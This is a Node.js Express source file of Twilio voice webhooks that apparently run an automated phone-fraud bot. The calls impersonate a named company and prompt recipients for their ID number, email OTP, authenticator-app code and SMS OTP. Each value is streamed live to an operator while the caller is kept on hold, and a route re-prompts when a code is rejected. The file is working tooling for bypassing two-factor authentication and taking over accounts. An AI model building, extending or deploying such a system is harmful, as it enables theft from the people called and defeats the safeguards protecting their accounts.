const express = require('express');
const router = express.Router();
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const db = require('../database/db');

router.get('/test', (req, res) => {
    res.send('Webhook is working! Server is online.');
});

router.post('/voice-response/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Voice response - Session:', sessionId);
    
    try {
        const session = await db.query(
            `SELECT cs.*, c.full_name FROM call_sessions cs 
             JOIN contacts c ON cs.contact_id = c.id 
             WHERE cs.id = $1`,
            [sessionId]
        );
        
        if (session.rows.length === 0) {
            twiml.say('Session not found. Goodbye.');
            twiml.hangup();
            return res.type('text/xml').send(twiml.toString());
        }
        
        const callData = session.rows[0];
        const currentAction = callData.current_action;
        const fullName = callData.full_name;
        const subject = callData.subject;
        const customIntro = callData.custom_intro;
        
        console.log('Current action:', currentAction);
        
        if (currentAction === 'consent') {
            const gather = twiml.gather({
                numDigits: 1,
                action: `/webhooks/handle-consent/${sessionId}`,
                method: 'POST',
                timeout: 10
            });
            
            let greeting = fullName ? `Hello ${fullName}, ` : 'Hello our valued client, ';
            
            if (subject && customIntro) {
                gather.say(`${greeting}${customIntro} Press 1 to continue.`);
            } else if (subject) {
                gather.say(`${greeting}This is ${subject} calling. Press 1 to continue.`);
            } else {
                gather.say(`${greeting}We are contacting you regarding your account. Press 1 to continue.`);
            }
            
            twiml.say('We did not receive any input. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_id') {
            const gather = twiml.gather({
                numDigits: 20,
                action: `/webhooks/collect-id/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter your ID number followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_email_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-email-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP from your email followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_auth_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-auth-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit code from your authenticator app followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'waiting_for_phone_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-phone-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP sent to your phone followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
            
        } else if (currentAction === 'playing_music') {
            twiml.say('Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } else {
            twiml.say('Please wait for admin instructions.');
            twiml.hangup();
        }
        
        res.type('text/xml');
        res.send(twiml.toString());
        
    } catch (error) {
        console.error('Error:', error);
        const twiml = new VoiceResponse();
        twiml.say('An error occurred.');
        twiml.hangup();
        res.type('text/xml');
        res.send(twiml.toString());
    }
});

router.post('/handle-consent/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Consent - Session:', sessionId, 'Digits:', Digits);
    
    if (Digits === '1') {
        await db.query(
            `UPDATE call_sessions SET current_action = 'waiting_for_id' WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO collected_data (session_id, data_type, data_value) VALUES ($1, $2, $3)`,
            [sessionId, 'consent', '1']
        );
        
        io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
        
        const gather = twiml.gather({
            numDigits: 20,
            action: `/webhooks/collect-id/${sessionId}`,
            method: 'POST',
            finishOnKey: '#',
            timeout: 10
        });
        gather.say('Please enter your ID number followed by the pound key.');
        twiml.say('No input received. Goodbye.');
        twiml.hangup();
        
    } else {
        twiml.say('You did not press 1. Goodbye.');
        twiml.hangup();
        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/check-hold/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const twiml = new VoiceResponse();
    
    const session = await db.query(
        `SELECT current_action FROM call_sessions WHERE id = $1`,
        [sessionId]
    );
    
    if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 5 });
        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
    } else {
        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-id/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('ID Collected:', Digits);
    
    if (Digits) {
        try {
            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
            
            if (session.rows.length === 0) {
                twiml.say('Session not found. Goodbye.');
                twiml.hangup();
                return res.type('text/xml').send(twiml.toString());
            }
            
            const contactId = session.rows[0].contact_id;
            
            await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, contactId]);
            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'id_number', Digits]);
            
            io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
            
            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
            
            twiml.say('Thank you. Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } catch (error) {
            console.error('Database error in collect-id:', error);
            twiml.say('An error occurred. Goodbye.');
            twiml.hangup();
        }
    } else {
        twiml.say('No ID received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-email-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Email OTP Collected:', Digits);
    
    if (Digits) {
        try {
            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
            
            if (session.rows.length === 0) {
                twiml.say('Session not found. Goodbye.');
                twiml.hangup();
                return res.type('text/xml').send(twiml.toString());
            }
            
            const contactId = session.rows[0].contact_id;
            
            await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
            
            io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
            
            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
            
            twiml.say('Thank you. Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } catch (error) {
            console.error('Database error in collect-email-otp:', error);
            twiml.say('An error occurred. Goodbye.');
            twiml.hangup();
        }
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-auth-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Auth OTP Collected:', Digits);
    
    if (Digits) {
        try {
            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
            
            if (session.rows.length === 0) {
                twiml.say('Session not found. Goodbye.');
                twiml.hangup();
                return res.type('text/xml').send(twiml.toString());
            }
            
            const contactId = session.rows[0].contact_id;
            
            await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
            
            io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
            
            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
            
            twiml.say('Thank you. Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } catch (error) {
            console.error('Database error in collect-auth-otp:', error);
            twiml.say('An error occurred. Goodbye.');
            twiml.hangup();
        }
    } else {
        twiml.say('No code received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-phone-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Phone OTP Collected:', Digits);
    
    if (Digits) {
        try {
            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
            
            if (session.rows.length === 0) {
                twiml.say('Session not found. Goodbye.');
                twiml.hangup();
                return res.type('text/xml').send(twiml.toString());
            }
            
            const contactId = session.rows[0].contact_id;
            
            await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
            
            io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
            
            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
            
            twiml.say('Thank you. Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } catch (error) {
            console.error('Database error in collect-phone-otp:', error);
            twiml.say('An error occurred. Goodbye.');
            twiml.hangup();
        }
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/custom-voice/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { message } = req.body;
    const twiml = new VoiceResponse();
    
    console.log('Custom voice for session:', sessionId, 'Message:', message);
    
    await db.query(`UPDATE call_sessions SET current_action = 'waiting_for_custom' WHERE id = $1`, [sessionId]);
    
    const gather = twiml.gather({
        numDigits: 20,
        action: `/webhooks/collect-custom/${sessionId}`,
        method: 'POST',
        finishOnKey: '#',
        timeout: 10
    });
    gather.say(message);
    twiml.say('No input received. Goodbye.');
    twiml.hangup();
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/collect-custom/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Custom data collected:', Digits);
    
    if (Digits) {
        try {
            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
            
            if (session.rows.length === 0) {
                twiml.say('Session not found. Goodbye.');
                twiml.hangup();
                return res.type('text/xml').send(twiml.toString());
            }
            
            const contactId = session.rows[0].contact_id;
            
            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'custom', Digits]);
            
            io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
            
            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
            
            twiml.say('Thank you. Please hold while we validate your details.');
            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
            
        } catch (error) {
            console.error('Database error in collect-custom:', error);
            twiml.say('An error occurred. Goodbye.');
            twiml.hangup();
        }
    } else {
        twiml.say('No input received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

router.post('/reject-last-data/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const io = req.app.get('io');
    
    console.log('Rejecting last data for session:', sessionId);
    
    try {
        const session = await db.query(
            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const lastDataType = session.rows[0]?.last_data_type;
        const lastDataValue = session.rows[0]?.last_data_value;
        
        if (lastDataType) {
            await db.query(
                `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
                [sessionId]
            );
            
            await db.query(
                `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
                [`waiting_for_${lastDataType}`, sessionId]
            );
            
            io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
            
            res.json({ success: true, message: `Last ${lastDataType} rejected` });
        } else {
            res.json({ success: false, message: 'No data to reject' });
        }
    } catch (error) {
        console.error('Error rejecting data:', error);
        res.status(500).json({ error: error.message });
    }
});

router.post('/call-status/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { CallStatus, Duration } = req.body;
    const io = req.app.get('io');
    
    console.log('Call Status:', CallStatus, 'Session:', sessionId);
    
    if (sessionId) {
        await db.query(
            `UPDATE call_sessions SET status = $1, duration_seconds = $2 WHERE id = $3`,
            [CallStatus, Duration || 0, sessionId]
        );
        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
    }
    
    res.sendStatus(200);
});

module.exports = router;
